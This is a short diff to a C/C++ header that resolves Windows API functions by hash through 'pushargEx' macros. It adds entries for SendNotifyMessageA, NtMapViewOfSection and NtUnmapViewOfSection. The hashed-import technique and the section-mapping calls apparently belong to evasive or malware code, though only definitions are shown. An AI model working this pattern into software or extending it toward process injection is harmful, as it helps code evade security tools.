@@ -602,6 +602,7 @@ const static int ApiCacheSize = 555;
 #define pSendInput					pushargEx< DLL_USER32, 0xce1781d0, 369 >
 #define pEnumThreadWindows          pushargEx< DLL_USER32, 0x605A65D8, 370 >
 #define pIsWindowEnabled			pushargEx< DLL_USER32, 0xEEC91F07, 371 >
+#define pSendNotifyMessageA			pushargEx< DLL_USER32, 0x1AB922BF, 0 >
 
 //winsock
 #define pWSACleanup 				pushargEx< DLL_WINSOCK, 0x8FB8B5BD, 372 >
@@ -669,6 +670,8 @@ const static int ApiCacheSize = 555;
 #define pRtlComputeCrc32			pushargEx< DLL_NTDLL,0x687B7023, 432 >
 #define pNtQuerySystemInformation	pushargEx< DLL_NTDLL,0xB044A119, 433 >
 #define pNtDeviceIoControlFile		pushargEx< DLL_NTDLL,0x385C70F2, 434 >
+#define pNtMapViewOfSection			pushargEx< DLL_NTDLL,0x534E9A3C, 0 >
+#define pNtUnmapViewOfSection		pushargEx< DLL_NTDLL,0x5ED4D3E1, 0 >
 
 
 //winsta
